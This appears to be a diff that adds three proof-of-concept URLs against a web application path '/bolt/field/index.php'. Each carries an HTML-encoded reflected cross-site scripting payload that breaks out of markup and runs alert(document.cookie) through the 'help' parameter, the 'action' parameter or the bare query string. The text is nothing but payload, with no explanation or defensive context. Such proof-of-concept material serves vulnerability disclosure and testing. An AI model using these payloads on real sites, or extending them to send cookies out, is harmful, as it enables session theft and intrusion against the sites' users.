@@ -1,0 +1,3 @@
+http://www.example.com/bolt/field/index.php?p=main&amp;help=&#039;&quot;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+http://www.example.com/bolt/field/index.php?&quot;&lt;/a&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/
+http://www.example.com/bolt/field/index.php?p=main&amp;action=&#039;&quot;&lt;/a&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;/&amp;file=file.jpg
